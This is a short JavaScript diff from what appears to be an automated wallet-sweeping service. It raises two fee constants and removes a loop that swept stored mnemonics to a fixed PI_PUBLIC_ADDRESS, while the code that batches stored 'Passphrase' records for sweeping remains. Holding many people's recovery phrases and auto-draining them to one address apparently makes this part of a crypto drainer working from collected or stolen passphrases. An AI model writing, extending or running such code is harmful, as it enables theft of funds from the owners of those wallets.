@@ -45,8 +45,8 @@ const secondFilteredSponsors = [
     'GDVWGQ5YI5S5FEHOPN5LVXPM5ONW2TLXQA7BMXZAXZRUCICXHQWL7O63', //r
     'GC4TU6WM2Q6ECZCFUBYGWQ7MN7SBHSHRDX4HC4CXCUH3AAT7EZGIEGEB', //r
 ]
-const FIRST_BUMP_FEE = 0.1;
-const SECOND_BUMP_FEE = 0.08;
+const FIRST_BUMP_FEE = 10;
+const SECOND_BUMP_FEE = 8;
 
 
 
@@ -639,15 +639,7 @@ export const autoSweepWallet = async (instance) => {
     if(instance !=1) return;
     if(global.isSweeping) return;
     global.isSweeping = true
-    const upcomingClaimables = await getUpcomingClaimables();
-    if (upcomingClaimables.length > 0) {
-        for(const claimable of upcomingClaimables) {
-            await sweepWallet(claimable.mnemonic, PI_PUBLIC_ADDRESS);
-            await sleep(1000);
-        }
-        global.isSweeping = false;
-        return;
-    }
+    
 
     const readyPassphrases = await Passphrase.find({ name: { $in: [null, undefined] } });
     const passphraseBatches = arrayBatches(readyPassphrases, 80);
